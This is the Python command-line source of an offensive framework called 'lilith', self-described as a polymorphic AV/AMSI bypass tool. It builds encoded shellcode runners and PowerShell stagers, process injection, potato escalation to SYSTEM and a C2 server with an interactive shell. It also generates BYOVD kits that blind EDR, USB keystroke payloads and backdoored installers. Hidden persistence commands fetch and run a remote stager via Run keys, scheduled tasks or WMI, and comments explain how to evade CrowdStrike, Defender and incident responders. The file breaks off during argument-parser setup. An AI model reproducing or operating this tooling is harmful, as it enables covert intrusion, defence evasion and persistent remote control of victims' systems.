#!/usr/bin/env python3
"""
Usage:
  lilith init                                    Create engagement.yaml
  lilith build --all                             Full pipeline: runner + tools + stagers
  lilith build --runner                          Build polymorphic C runner
  lilith build --tool SharpUp                    Encode single tool
  lilith build --tools                           Encode all tools from engagement.yaml
  lilith build --stager sharpup                  Generate PS1 stager for a tool
  lilith build --stagers                         Generate all stagers
  lilith build --escalate GodPotato \\
               --system-tool SharpHound          Escalation chain: potato → SYSTEM payload
  lilith serve [--port 8443]                     HTTPS file server + callback listener
  lilith list                                    List available tools
  lilith check                                   Verify dependencies
"""

import argparse
import json
import os
import shutil
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.config   import load_config, create_default_config
from core.workspace import Workspace
from builders.encoder import (
    encode_tool, find_tool, find_tool_icase, list_tools, resolve_params,
    TOOL_CATALOG, is_dotnet_assembly,
)
from builders.stager  import generate_stager, generate_escalation_chain_params
from builders.runner  import build_runner, build_runner_sc, build_runner_sc_c2
from builders.byovd   import build_byovd, build_byovd_sc
from builders.usbhid  import build_usb_payload, DEVICES as USB_DEVICES
from server.https_server import start_server, get_c2_sessions, _c2_push_task, _c2_get_result


# ── helpers ────────────────────────────────────────────────────────────────────

def _read_runner_key(ws: Workspace) -> int:
    """Read the XOR key used to encode runner_c.dat. Falls back to legacy 0x5A."""
    meta = ws.path("runner_c.meta")
    if os.path.exists(meta):
        with open(meta) as f:
            return json.load(f).get("xor_key", 0x5A)
    return 0x5A


def _write_runner_key(ws: Workspace, key: int) -> None:
    with open(ws.path("runner_c.meta"), "w") as f:
        json.dump({"xor_key": key}, f)


def _stager_kwargs(cfg: dict, ws: Workspace, runner_key: int | None = None) -> dict:
    if runner_key is None:
        runner_key = _read_runner_key(ws)
    runner_dat = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
    return dict(
        lhost               = cfg.get("lhost", "10.10.14.1"),
        port                = cfg.get("http_port", 8443),
        injection_profile   = cfg.get("injection_profile", "RuntimeBroker.exe"),
        output_capture      = True,
        use_https           = True,
        sni_host            = cfg.get("sni_host", "assets.msn.com"),
        url_prefix          = cfg.get("url_prefix", "/cdn/static/v3"),
        callback_path       = cfg.get("callback_path", "/api/diagnostics/v1/telemetry"),
        jitter_min_ms       = cfg.get("jitter_min_ms", 1500),
        jitter_max_ms       = cfg.get("jitter_max_ms", 6000),
        user_agent          = cfg.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"),
        runner_xor_key      = runner_key,
        runner_dat_filename = runner_dat,
    )


def _encode_tool_with_cfg(
    tname:           str,
    cfg:             dict,
    ws:              Workspace,
    override_params: str | None = None,
) -> bool:
    """Encode a single tool using params from engagement config or catalog defaults.
    Substitutes LHOST in params before encoding.
    override_params, if given, takes priority over config and catalog defaults."""
    if override_params is not None:
        params = override_params
    else:
        tool_cfg = cfg.get("tools", {}).get(tname, {})
        params   = tool_cfg.get("params") if isinstance(tool_cfg, dict) else None
        if params is None:
            entry  = TOOL_CATALOG.get(tname, {})
            params = entry.get("default_params")
    params = resolve_params(params, cfg.get("lhost", "10.10.14.1"))

    binary = find_tool(tname)
    if not binary:
        print(f"[!] Tool binary not found: {tname}")
        return False

    enc_filename = ws.alloc_enc_name(tname)
    enc_out = ws.path(enc_filename)
    ok = encode_tool(binary, params, enc_out)
    if ok:
        clr = is_dotnet_assembly(binary)
        ws.set_tool_meta(tname, {"clr": clr, "args": params or ""})
    return ok


# ── subcommands ────────────────────────────────────────────────────────────────

def cmd_init(args, cfg, ws):
    create_default_config()


def cmd_build(args, cfg, ws):
    did_something = False
    lhost = cfg.get("lhost", "10.10.14.1")
    port  = cfg.get("http_port", 8443)

    # ── Runner ────────────────────────────────────────────────────────────────
    if args.runner or args.all:
        runner_dat_name = ws.alloc_enc_name("__runner_dat__")
        out = ws.path(runner_dat_name)
        ok, runner_key = build_runner(
            output_dat        = out,
            injection_target  = cfg.get("injection_profile", "RuntimeBroker.exe"),
            sni_host          = cfg.get("sni_host", "assets.msn.com"),
            user_agent        = cfg.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"),
            c2_host           = cfg.get("lhost", "10.10.14.1"),
            c2_port           = cfg.get("http_port", 8443),
            c2_cb_path        = cfg.get("callback_path", "/api/diagnostics/v1/telemetry"),
            c2_https          = True,
            c2_jitter_min_ms  = cfg.get("c2_jitter_min_ms", 10000),
            c2_jitter_max_ms  = cfg.get("c2_jitter_max_ms", 30000),
            # Task 13: domain fronting (optional — set front_host in engagement.yaml)
            front_host        = cfg.get("front_host"),
            keep_exe          = True,
        )
        if not ok:
            sys.exit(1)
        _write_runner_key(ws, runner_key)
        # Build fileless C2 agent SC (donut runner -agent) alongside the runner enc
        runner_exe_path = os.path.splitext(out)[0] + ".exe"
        if os.path.exists(runner_exe_path):
            c2_sc_name = ws.alloc_enc_name("__runner_sc_c2__")
            build_runner_sc_c2(runner_exe_path, ws.path(c2_sc_name))
        did_something = True

    # ── Encode tools ──────────────────────────────────────────────────────────
    tools_to_encode: list[str] = []
    if args.all or args.tools:
        tools_to_encode = list(cfg.get("tools", {}).keys())
    elif args.tool:
        tools_to_encode = [args.tool]

    for tname in tools_to_encode:
        override = getattr(args, "args", None) if (args.tool and tname == args.tool) else None
        _encode_tool_with_cfg(tname, cfg, ws, override_params=override)
        did_something = True

    # ── Generate stagers ──────────────────────────────────────────────────────
    stagers_to_gen: list[str] = []
    if args.all or args.stagers:
        stagers_to_gen = [
            t for t in cfg.get("tools", {}).keys()
            if ws.get_enc_name(t) and os.path.exists(ws.path(ws.get_enc_name(t)))
        ]
    elif args.stager:
        stagers_to_gen = [args.stager]

    runner_key      = _read_runner_key(ws)
    _runner_dat     = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
    runner_exe      = ws.path(os.path.splitext(_runner_dat)[0] + ".exe")
    has_runner      = os.path.exists(runner_exe)
    scheme      = "https"
    url_prefix  = cfg.get("url_prefix",    "/cdn/static/v3")
    cb_path     = cfg.get("callback_path", "/api/diagnostics/v1/telemetry")

    for tname in stagers_to_gen:
        enc_filename = ws.get_enc_name(tname)
        if not enc_filename or not os.path.exists(ws.path(enc_filename)):
            print(f"[!] No encoded artifact for {tname} — run: lilith build --tool {tname}")
            continue

        # Build per-tool runner shellcode (in-memory injection, no PE on disk)
        runner_sc_enc = None
        runner_sc_cb  = None
        if has_runner:
            import secrets as _sec
            token         = _sec.token_hex(8)
            tool_url      = f"{scheme}://{lhost}:{port}{url_prefix}/{enc_filename}"
            runner_sc_cb  = f"{scheme}://{lhost}:{port}{cb_path}/{token}"
            sc_enc_name   = _sec.token_hex(8) + "_sc.enc"
            if build_runner_sc(runner_exe, tool_url, runner_sc_cb, ws.path(sc_enc_name)):
                runner_sc_enc = sc_enc_name

        tool_meta  = ws.get_tool_meta(tname)
        is_clr     = tool_meta.get("clr", False)
        tool_baked = tool_meta.get("args", "") or None

        # Task 3: non-.NET native EXEs use the custom PE loader stager instead of donut.
        # This eliminates the donut CLR COM bootstrap sequence from the stager path.
        is_native_pe = not is_clr and runner_sc_enc is None

        stager_name = ws.alloc_stager_name(tname)
        out = ws.path(stager_name)
        generate_stager(
            tool_name              = tname,
            enc_filename           = enc_filename,
            output_path            = out,
            runner_sc_enc_filename = runner_sc_enc,
            runner_sc_cb_url       = runner_sc_cb,
            clr_mode               = is_clr,
            native_pe_mode         = is_native_pe,
            tool_args              = tool_baked if is_clr else None,
            **_stager_kwargs(cfg, ws, runner_key),
        )
        did_something = True

    # Clean up runner exe after all SCs are built
    if has_runner and stagers_to_gen:
        try:
            os.remove(runner_exe)
        except OSError:
            pass

    # ── Escalation chain ──────────────────────────────────────────────────────
    if args.escalate:
        if not args.system_tool:
            print("[!] --escalate requires --system-tool NAME")
            sys.exit(1)

        # Normalise potato name (case-insensitive lookup)
        potato_key = find_tool_icase(args.escalate)
        if not potato_key:
            print(f"[!] Unknown potato tool: {args.escalate}")
            print(f"    Available: GodPotato, PrintSpoofer, PrintSpoofer32, JuicyPotato, RoguePotato")
            sys.exit(1)

        # Accept catalog tools OR custom .enc files already in the workspace
        system_key      = find_tool_icase(args.system_tool)
        system_enc_name = ws.alloc_enc_name(system_key or args.system_tool)
        system_enc_path = ws.path(system_enc_name)

        if not system_key and not os.path.exists(system_enc_path):
            print(f"[!] Unknown system tool and no encoded artifact found for: {args.system_tool}")
            print(f"    Either use a catalog tool name or run: build --shellcode FILE --name {args.system_tool}")
            sys.exit(1)

        potato_binary = find_tool(potato_key)
        if not potato_binary:
            print(f"[!] Binary not found for {potato_key}")
            sys.exit(1)

        # Ensure system tool is encoded (catalog tools only — custom .enc already exists)
        if system_key and not os.path.exists(system_enc_path):
            print(f"[*] System tool not encoded yet — building {system_key}.enc")
            if not _encode_tool_with_cfg(system_key, cfg, ws):
                sys.exit(1)

        runner_key = _read_runner_key(ws)
        _esc_runner_dat = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
        if not os.path.exists(ws.path(_esc_runner_dat)):
            print("[!] Runner not found — build --runner first")
            sys.exit(1)

        print(f"\n[*] Escalation chain: {potato_key} → SYSTEM:{system_key or args.system_tool}")
        runner_dat_name_esc = ws.get_enc_name("__runner_dat__") or "runner_c.dat"
        chain_params = generate_escalation_chain_params(
            potato_tool              = potato_key,
            lhost                    = lhost,
            port                     = port,
            system_tool_enc_filename = system_enc_name,
            url_prefix               = cfg.get("url_prefix", "/cdn/static/v3"),
            use_https                = True,
            runner_xor_key           = runner_key,
            runner_dat_filename      = runner_dat_name_esc,
        )

        chain_enc_name = ws.alloc_enc_name(f"{potato_key}_chain")
        chain_enc_path = ws.path(chain_enc_name)
        if not encode_tool(potato_binary, chain_params, chain_enc_path):
            sys.exit(1)

        chain_stager_name = ws.alloc_stager_name(f"{potato_key}_chain")
        chain_stager = ws.path(chain_stager_name)
        generate_stager(
            tool_name    = f"{potato_key}_chain",
            enc_filename = chain_enc_name,
            output_path  = chain_stager,
            **_stager_kwargs(cfg, ws, runner_key),
        )

        print(f"\n[+] Chain ready. Serve {chain_enc_name} + {system_enc_name} + runner_c.dat")
        print(f"    Run stager on target (SeImpersonate user) → {potato_key} escalates → SYSTEM self-injects {system_key or args.system_tool}")
        did_something = True

    # ── Raw shellcode packing ─────────────────────────────────────────────────
    if args.shellcode:
        if not args.name:
            print("[!] --shellcode requires --name (e.g. --name revshell)")
            sys.exit(1)
        if not os.path.exists(args.shellcode):
            print(f"[!] File not found: {args.shellcode}")
            sys.exit(1)
        from core.encoding import pack_enc
        with open(args.shellcode, "rb") as f:
            raw_sc = f.read()
        enc_filename = ws.alloc_enc_name(args.name)
        enc_out = ws.path(enc_filename)
        with open(enc_out, "wb") as f:
            f.write(pack_enc(raw_sc))
        size_kb = len(raw_sc) / 1024
        print(f"[+] {args.shellcode} → {enc_out} ({size_kb:.1f} KB shellcode)")
        runner_key = _read_runner_key(ws)
        stager_name = ws.alloc_stager_name(args.name)
        out = ws.path(stager_name)
        generate_stager(
            tool_name    = args.name,
            enc_filename = enc_filename,
            output_path  = out,
            **_stager_kwargs(cfg, ws, runner_key),
        )
        did_something = True

    # ── C2 agent stager ───────────────────────────────────────────────────────
    if getattr(args, "c2_stager", False):
        c2_sc_name = ws.get_enc_name("__runner_sc_c2__")
        if not c2_sc_name or not os.path.exists(ws.path(c2_sc_name)):
            print("[!] C2 agent shellcode not found — run: lilith build --runner first")
            sys.exit(1)
        c2_stager_name = ws.alloc_stager_name("__c2_agent__")
        c2_stager_path = ws.path(c2_stager_name)
        generate_stager(
            tool_name              = "c2_agent",
            enc_filename           = c2_sc_name,
            output_path            = c2_stager_path,
            runner_sc_enc_filename = c2_sc_name,
            runner_sc_cb_url       = None,
            **_stager_kwargs(cfg, ws),
        )
        print(f"\n[+] C2 agent stager ready (fileless — injects into existing process)")
        print(f"    Targets: svchost → RuntimeBroker → explorer → dllhost → sihost → ctfmon")
        print(f"    Fallback: self-inject into current PS process")
        print(f"    After running on target: lilith c2 --list  (session in ~30s)")
        did_something = True

    # ── BYOVD kit ─────────────────────────────────────────────────────────────
    if getattr(args, "byovd", False):
        byovd_out = ws.path("byovd.exe")
        build_byovd(byovd_out)

        # Fileless shellcode variant — driver path + ops baked in at build time.
        # The .sys driver still needs to be uploaded to disk on target first.
        driver_path = getattr(args, "byovd_driver", None) or r"C:\Windows\Temp\driver.sys"
        byovd_ops   = getattr(args, "byovd_ops",    None) or "--etwti --remove-callbacks --remove-ob-callbacks"
        enc_out = ws.path("byovd.enc")
        build_byovd_sc(driver_path, byovd_ops, enc_out)

        did_something = True

    # ── USB HID payload ───────────────────────────────────────────────────────
    if getattr(args, "usb", None):
        tname = args.usb
        stager_name = ws._load_manifest().get(f"stager_{tname}")
        if not stager_name:
            print(f"[!] No stager found for '{tname}' — run: lilith build --stager {tname}")
            sys.exit(1)
        scheme     = "https"
        url_prefix = cfg.get("url_prefix", "/cdn/static/v3")
        stager_url = f"{scheme}://{lhost}:{port}{url_prefix}/{stager_name}"
        usb_out    = getattr(args, "usb_out",        None) or ws.path("usb")
        usb_dev    = getattr(args, "usb_device",     "all")
        usb_boot   = getattr(args, "usb_boot_delay", 2000)
        build_usb_payload(stager_url, usb_out, device=usb_dev, boot_delay_ms=usb_boot)
        did_something = True

    if not did_something:
        print("[!] Nothing to build — specify --runner, --tool NAME, --tools, --stager NAME,")
        print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
        print("    --shellcode FILE --name NAME, --c2-stager, --byovd, or --usb TOOL")


def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | None:
    """
    Build the command string (sent to the agent as a task) that installs persistence.

    The agent executes this via cmd.exe /c <command>, so we generate a PowerShell
    invocation that sets up the persistence mechanism.  The payload re-downloads and
    executes the C2 agent stager, which re-establishes the C2 session on each trigger.

    Supported mechanisms:
      wmi      — WMI CommandLine Event Consumer (admin/SYSTEM; survives reboots)
      run      — HKCU Run key (user-level; fires at logon)
      schtask  — Scheduled task (user-level; fires at logon, highest privilege)

    All three store the stager download command base64-encoded (-enc) so no raw
    URL or PowerShell commands appear in registry/WMI values at rest.
    """
    from builders.stager import _rv, _xurl
    import base64 as _b64
    import secrets as _sec

    scheme  = "https"
    lhost   = cfg.get("lhost", "10.10.14.1")
    port    = cfg.get("http_port", 8443)
    url_pfx = cfg.get("url_prefix", "/cdn/static/v3")

    # Find the C2 agent stager PS1
    stager_name = ws.alloc_stager_name("__c2_agent__")
    stager_url  = f"{scheme}://{lhost}:{port}{url_pfx}/{stager_name}"
    if not os.path.exists(ws.path(stager_name)):
        print(f"[!] C2 agent stager not found — run: lilith build --c2-stager first")
        return None

    # Task 7 — Shrink persistence payload.
    # The old approach embedded the full stager bootstrap (AMSI bypass + WinHTTP download)
    # as a -enc argument, producing 2-5KB of base64 visible in the registry/WMI value.
    # A large -enc blob is a well-known heuristic (CrowdStrike, Defender, Tanium).
    #
    # New approach: a tiny PS1 one-liner that fetches and executes the stager via a single
    # WinHttp call. The stager URL is XOR-encoded in the one-liner so no plain IP/path
    # appears in the persistence artifact. The resulting -enc is <300 bytes.
    url_key = _sec.randbits(7) + 15  # 15-142 key range, avoids 0
    url_enc  = ",".join(str(ord(c) ^ url_key) for c in stager_url)
    # Compact one-liner: decode URL, fetch, execute
    compact_ps1 = (
        f"$k={url_key};"
        f"$u=([byte[]]@({url_enc})|%{{[char]($_ -bxor $k)}})-join'';"
        f"$h=New-Object -ComObject WinHttp.WinHttpRequest.5.1;"
        f"$h.Open('GET',$u,$false);$h.Option(4)=13056;$h.Send();"
        f"[scriptblock]::Create($h.ResponseText).Invoke()"
    )
    enc_b64 = _b64.b64encode(compact_ps1.encode("utf-16-le")).decode()

    rand_name = "Msft" + _sec.token_hex(4).upper()
    ps_cmd    = f"powershell -nop -w hidden -ep bypass -enc {enc_b64}"

    if persist_type == "run":
        # HKCU Run key — fires at user logon, no admin required
        reg_val = ps_cmd.replace('"', '\\"')
        return (
            f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            f'/v {rand_name} /t REG_SZ /d "{reg_val}" /f'
        )

    elif persist_type == "schtask":
        # Scheduled task — fires at logon, survives session reconnects
        task_arg = f"-nop -w hidden -ep bypass -enc {enc_b64}"
        return (
            f'schtasks /create /tn "{rand_name}" /tr '
            f'"powershell {task_arg}" '
            f'/sc ONLOGON /ru "%USERDOMAIN%\\%USERNAME%" /rl HIGHEST /f'
        )

    elif persist_type == "wmi":
        # Task 6 — WMI persistence with logon-based trigger instead of uptime.
        # Uptime-based (__InstanceModificationEvent on Win32_PerfFormattedData_PerfOS_System)
        # is one of the first queries IR teams run ("Invoke-WMISweep", SentinelOne WMI sweep).
        # Win32_ProcessStartTrace WHERE ProcessName='explorer.exe' fires on every
        # interactive logon (explorer starts per-session) and is significantly quieter.
        # Requires admin-level WMI subscription namespace.
        wmi_ps = ";".join([
            f"$fn='{rand_name}'",
            "$ns='root\\subscription'",
            # Logon trigger: fires when explorer.exe starts (per interactive logon session)
            "$flt=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments "
            "@{Name=$fn;QueryLanguage='WQL';"
            "Query=\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'\"}",
            f"$cns=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer "
            f"-Arguments @{{Name=$fn;CommandLineTemplate='{ps_cmd}'}}",
            "Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding "
            "-Arguments @{Filter=$flt;Consumer=$cns}",
        ])
        wmi_b64 = _b64.b64encode(wmi_ps.encode("utf-16-le")).decode()
        return f"powershell -nop -ep bypass -enc {wmi_b64}"

    return None


def cmd_serve(args, cfg, ws):
    port      = args.port      or cfg.get("http_port",   8443)
    mgmt_port = args.mgmt_port or cfg.get("mgmt_port",   8444)
    start_server(
        workspace       = ws.directory,
        lhost           = "0.0.0.0",
        port            = port,
        mgmt_port       = mgmt_port,
        callback_prefix = cfg.get("callback_path", "/api/diagnostics/v1/telemetry"),
    )


def cmd_c2(args, cfg, ws):
    import http.client, time as _time

    mgmt_port = cfg.get("mgmt_port", 8444)
    wait_secs = args.timeout if getattr(args, "timeout", None) else cfg.get("c2_timeout_s", 50)

    def _mgmt_get(path):
        try:
            c = http.client.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
            c.request("GET", path)
            r = c.getresponse()
            body = r.read()
            c.close()
            return r.status, body
        except Exception as e:
            return None, str(e).encode()

    def _mgmt_post(path, payload):
        try:
            body = json.dumps(payload).encode()
            c = http.client.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
            c.request("POST", path, body, {"Content-Type": "application/json"})
            r = c.getresponse()
            resp = r.read()
            c.close()
            return r.status, resp
        except Exception as e:
            return None, str(e).encode()

    def _mgmt_delete(path):
        try:
            c = http.client.HTTPConnection("127.0.0.1", mgmt_port, timeout=5)
            c.request("DELETE", path)
            r = c.getresponse()
            body = r.read()
            c.close()
            return r.status, body
        except Exception as e:
            return None, str(e).encode()

    def _push_and_wait(sid, cmd_str):
        """Push cmd_str as a task and wait for the result. Returns output string or None."""
        st, body = _mgmt_post(f"/mgmt/{sid}/task", {"cmd": cmd_str})
        if st is None:
            print(f"[!] Cannot reach management API: {body.decode()[:100]}")
            return None
        if st == 404:
            print(f"[!] Session {sid} not found")
            return None
        try:
            tid = json.loads(body)["task_id"]
        except Exception:
            print(f"[!] Unexpected response: {body.decode()[:200]}")
            return None
        print(f"[*] Task {tid} queued — waiting ({wait_secs}s)...")
        deadline = _time.time() + wait_secs
        while _time.time() < deadline:
            st2, body2 = _mgmt_get(f"/mgmt/{sid}/result/{tid}")
            if st2 == 200:
                try:
                    out = json.loads(body2)["output"]
                    return out if out else "[no output]"
                except Exception:
                    return body2.decode()
            _time.sleep(1)
        print(f"[!] Timeout (task {tid})")
        return None

    # ── --kill: forget a session (no --session required) ──────────────────────
    if getattr(args, "kill", None):
        st, body = _mgmt_delete(f"/mgmt/{args.kill}")
        if st is None:
            print(f"[!] Cannot reach management API on port {mgmt_port}")
            return
        if st == 404:
            print(f"[!] Session {args.kill} not found")
            return
        print(f"[+] Session {args.kill} killed")
        return

    # ── --list / no session: print session table ───────────────────────────────
    if args.list or not args.session:
        st, body = _mgmt_get("/mgmt/sessions")
        if st is None:
            print(f"[!] Cannot reach management API on port {mgmt_port} — is 'lilith serve' running?")
            return
        try:
            sessions = json.loads(body)
        except Exception:
            print(f"[!] Bad response: {body.decode()[:200]}")
            return
        if not sessions:
            print("[*] No active C2 sessions")
            return
        print(f"\n{'Session ID':<18} {'Host':<18} {'Pending':<8} {'Last seen':<10} {'Status'}")
        print("-" * 70)
        for s_id, info in sessions.items():
            status = "[stale]" if info.get("stale") else "[alive]"
            print(f"{s_id:<18} {info['host']:<18} {info['pending']:<8} {info['last_seen']:<10} {status}")
        print()
        return

    sid = args.session

    # ── --migrate [PROCESS]: ask agent to inject itself into another process ───
    if getattr(args, "migrate", None) is not None:
        target  = args.migrate or ""
        migrate_cmd = f"migrate {target}".strip()
        result  = _push_and_wait(sid, migrate_cmd)
        if result is not None:
            print(result)
            if "[+]" in result:
                print(f"\n[*] Old session {sid} is still alive until the process dies.")
                print(f"    Wait ~30s for the new session to appear, then: lilith c2 --list")
                print(f"    Kill this session when done: lilith c2 --kill {sid}")
        return

    # ── --persist TYPE: install persistence via the agent ─────────────────────
    if getattr(args, "persist", None):
        persist_cmd = _build_persist_cmd(args.persist, cfg, ws)
        if not persist_cmd:
            return
        print(f"[*] Installing {args.persist} persistence via session {sid}...")
        result = _push_and_wait(sid, persist_cmd)
        if result is not None:
            print(result)
        mech = {
            "run":     "HKCU Run key fires at next user logon",
            "schtask": "Scheduled task fires at next user logon",
            "wmi":     "WMI subscription fires 120s after next boot/resume",
        }.get(args.persist, "")
        if mech:
            print(f"\n[*] {mech}")
            print(f"    Payload: downloads C2 agent stager → re-establishes session")
        return

    # ── --cmd: one-shot command ────────────────────────────────────────────────
    if args.cmd:
        result = _push_and_wait(sid, args.cmd)
        if result is not None:
            print(result)
        return

    # ── Interactive REPL ───────────────────────────────────────────────────────
    print(f"[*] C2 shell → session {sid}")
    print(f"    Built-in: migrate [proc.exe]  |  !persist wmi|run|schtask  |  !kill  |  !timeout <sec>\n")
    while True:
        try:
            cmd_input = input("C2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not cmd_input:
            continue
        if cmd_input.lower() in ("exit", "quit"):
            break

        # Local REPL meta-commands
        if cmd_input == "!kill":
            st_k, _ = _mgmt_delete(f"/mgmt/{sid}")
            if st_k == 200:
                print(f"[+] Session {sid} killed")
            else:
                print(f"[!] Kill failed (status {st_k})")
            break

        if cmd_input.startswith("!timeout "):
            try:
                wait_secs = int(cmd_input.split(None, 1)[1])
                print(f"[*] Timeout set to {wait_secs}s")
            except ValueError:
                print("[!] Usage: !timeout <seconds>")
            continue

        if cmd_input.startswith("!persist "):
            ptype = cmd_input.split(None, 1)[1].strip()
            if ptype not in ("wmi", "run", "schtask"):
                print("[!] Usage: !persist wmi|run|schtask")
                continue
            pcmd = _build_persist_cmd(ptype, cfg, ws)
            if not pcmd:
                continue
            result = _push_and_wait(sid, pcmd)
            if result is not None:
                print(result)
            continue

        # Regular command — agent handles migrate/pid builtins itself
        st, body = _mgmt_post(f"/mgmt/{sid}/task", {"cmd": cmd_input})
        if st is None:
            print(f"[!] {body.decode()[:100]}")
            continue
        if st == 404:
            print(f"[!] Session {sid} not found — agent may have disconnected")
            break
        try:
            tid = json.loads(body)["task_id"]
        except Exception:
            print(f"[!] {body.decode()[:200]}")
            continue

        deadline = _time.time() + wait_secs
        got = False
        while _time.time() < deadline:
            st2, body2 = _mgmt_get(f"/mgmt/{sid}/result/{tid}")
            if st2 == 200:
                try:
                    out = json.loads(body2)["output"]
                    print(out if out else "[no output]")
                except Exception:
                    print(body2.decode())
                got = True
                break
            _time.sleep(1)
        if not got:
            print(f"[!] Timeout (task {tid}) — use '!timeout <sec>' to increase the wait")


def cmd_list(args, cfg, ws):
    list_tools()


def cmd_check(args, cfg, ws):
    print("[*] Dependency check\n")
    deps = {
        "x86_64-w64-mingw32-gcc": "gcc-mingw-w64",
        "donut":                   "pip install donut-shellcode",
        "openssl":                 "openssl (pre-installed)",
        "python3":                 "python3",
    }
    all_ok = True
    for bin_, pkg in deps.items():
        found  = shutil.which(bin_)
        status = "✓" if found else "✗"
        note   = found or f"missing — {pkg}"
        print(f"  [{status}] {bin_:<30} {note}")
        if not found:
            all_ok = False
    print()
    if all_ok:
        print("[+] All dependencies found")
    else:
        print("[!] Missing dependencies above")


# ── banner ────────────────────────────────────────────────────────────────────

def _banner() -> None:
    tty = sys.stdout.isatty()
    P   = "\033[1;35m"  if tty else ""   # bold magenta  — the art
    D   = "\033[2;37m"  if tty else ""   # dim white     — the words
    R   = "\033[0m"     if tty else ""

    print(f"""
{P} _       ___   _       ___   _____  _  _  {R}
{P}) |     )_ _( ) |     )_ _( )__ __() () ({R}
{P}| (__   _| |_ | (__   _| |_   | |  | -- |{R}
{P})____( )_____()____( )_____(  )_(  )_()_({R}

{D}  She existed before the first rule was written.{R}
{D}  She will remain long after the last one is broken.{R}
""")


def cmd_patch(args, cfg, ws):
    from builders.patcher import backdoor_pe, backdoor_pe_from_stager

    if args.sc:
        # pre-built shellcode provided — skip donut
        with open(args.sc, "rb") as f:
            shellcode = f.read()
        from builders.patcher import backdoor_pe
        backdoor_pe(args.target, shellcode, args.output, args.section)
    else:
        # derive stager URL from engagement config (same logic as cmd_build)
        lhost     = cfg.get("lhost", "127.0.0.1")
        http_port = cfg.get("http_port", 8443)
        base_url  = f"https://{lhost}:{http_port}"
        stager_url = f"{base_url}/cdn/static/v3/stage.ps1"
        print(f"[*] Stager URL : {stager_url}")
        backdoor_pe_from_stager(args.target, stager_url, args.output, args.section)


# ── CLI ────────────────────────────────────────────────────────────────────────

def main():
    _banner()
    parser = argparse.ArgumentParser(
        prog="lilith",
        description="polymorphic AV/AMSI bypass framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    sub = parser.add_subparsers(dest="command", metavar="command")

    sub.add_parser("init",  help="Create engagement.yaml from template")
    sub.add_parser("list",  help="List available tools (✓ = binary found on disk)")
    sub.add_parser("check", help="Verify build dependencies")

    build_p = sub.add_parser("build", help="Build runner / encode tools / generate stagers")
    build_p.add_argument("--runner",      action="store_true", help="Build polymorphic C runner")
    build_p.add_argument("--tool",        metavar="NAME",      help="Encode single tool → .enc")
    build_p.add_argument("--tools",       action="store_true", help="Encode all tools in engagement.yaml")
    build_p.add_argument("--stager",      metavar="NAME",      help="Generate PS1 stager for one tool")
    build_p.add_argument("--stagers",     action="store_true", help="Generate stagers for all encoded tools")
    build_p.add_argument("--all",         action="store_true", help="Full pipeline: runner + tools + stagers")
    build_p.add_argument("--escalate",    metavar="POTATO",
                         help="Escalation chain potato tool: GodPotato|PrintSpoofer|JuicyPotato|RoguePotato")
    build_p.add_argument("--system-tool", metavar="NAME",
                         help="Tool to self-inject as SYSTEM after escalation (use with --escalate)")
    build_p.add_argument("--shellcode",   metavar="FILE",
                         help="Pack raw shellcode .bin into .enc + generate stager (MSF/Sliver/custom)")
    build_p.add_argument("--name",        metavar="NAME",
                         help="Output name for --shellcode (e.g. revshell)")
    build_p.add_argument("--args",        metavar="ARGS",
                         help="Override tool params for --tool (e.g. --args \"find /ca /enrolleeSuppliesSubject\")")
    build_p.add_argument("--c2-stager",   action="store_true", dest="c2_stager",
                         help="Generate fileless C2 agent stager (injects runner shellcode, no PE on disk)")
    build_p.add_argument("--byovd",        action="store_true",
                         help="Build BYOVD kit: GUI exe + fileless shellcode .enc (ETW-TI, OB callbacks, PPL, DSE)")
    build_p.add_argument("--byovd-driver", metavar="PATH", dest="byovd_driver",
                         default=r"C:\Windows\Temp\driver.sys",
                         help=r"Driver path on target baked into byovd.enc (default: C:\Windows\Temp\driver.sys)")
    build_p.add_argument("--byovd-ops",    metavar="OPS",  dest="byovd_ops",
                         default="--etwti --remove-callbacks --remove-ob-callbacks",
                         help="Operations to bake into byovd.enc (default: full Falcon blinding)")
    build_p.add_argument("--usb",           metavar="TOOL",  dest="usb",
                         help="Generate USB HID keystroke payloads for a built stager (tool name)")
    build_p.add_argument("--usb-device",    metavar="TYPE",  dest="usb_device", default="all",
                         choices=list(USB_DEVICES) + ["all"],
                         help="HID device type: duck | pico | digispark | all  (default: all)")
    build_p.add_argument("--usb-out",       metavar="DIR",   dest="usb_out",    default=None,
                         help="Output directory for payload files (default: <workspace>/usb/)")
    build_p.add_argument("--usb-boot-delay", metavar="MS",   dest="usb_boot_delay", type=int, default=2000,
                         help="USB enumeration + HID driver wait in ms (default: 2000, increase for slow targets)")

    serve_p = sub.add_parser("serve", help="Start HTTPS server + callback listener")
    serve_p.add_argument("--port",      type=int, metavar="PORT", help="Override http_port from config")
    serve_p.add_argument("--mgmt-port", type=int, metavar="PORT", dest="mgmt_port",
                         help="Management API port for 'lilith c2' (default 8444)")

    patch_p = sub.add_parser("patch", help="Backdoor a PE installer with the C2 stager shellcode")
    patch_p.add_argument("--target",  required=True,  metavar="EXE",  help="Legitimate PE to backdoor (not modified in place)")
    patch_p.add_argument("--output",  required=True,  metavar="EXE",  help="Output path for backdoored PE")
    patch_p.add_argument("--section", metavar="NAME",                 help="Section name override (randomised if omitted)")
    patch_p.add_argument("--sc",      metavar="BIN",                  help="Pre-built raw shellcode file (skip donut step)")

